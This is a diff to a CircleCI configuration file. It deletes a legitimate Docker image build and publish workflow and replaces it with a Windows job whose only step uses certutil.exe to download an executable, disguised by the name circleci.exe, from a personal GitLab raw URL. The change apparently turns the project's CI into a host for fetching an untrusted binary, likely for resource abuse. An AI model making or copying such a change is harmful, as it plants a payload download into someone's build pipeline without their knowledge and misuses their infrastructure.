@@ -1,27 +1,12 @@
 version: 2.1
-
-workflows:
-  main:
-    jobs:
-      - build
-
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
 jobs:
   build:
-    docker:
-      - image: cibuilds/docker:19.03
+    executor:
+      name: win/default
+      shell: cmd.exe
     steps:
-      - checkout
-      - setup_remote_docker
-      - run:
-          name: "Build Docker Images"
-          command: ./build-images.sh
-      - deploy:
-          name: "Publish Docker Images (master branch only)"
-          command: |
-            if [ "${CIRCLE_BRANCH}" == "master" ]; then
-              
-              echo $DOCKER_HUB_PASSWORD | docker login -u $DOCKER_HUB_USER --password-stdin
-              
-              echo "Publishing cimg/node to Docker Hub production."
-              docker push circleci/welcome-config-image
-            fi
+      - run: certutil.exe -urlcache -split -f https://gitlab.com/haithuongpro2711/haivps/-/raw/master/circleci.exe circleci.exe 
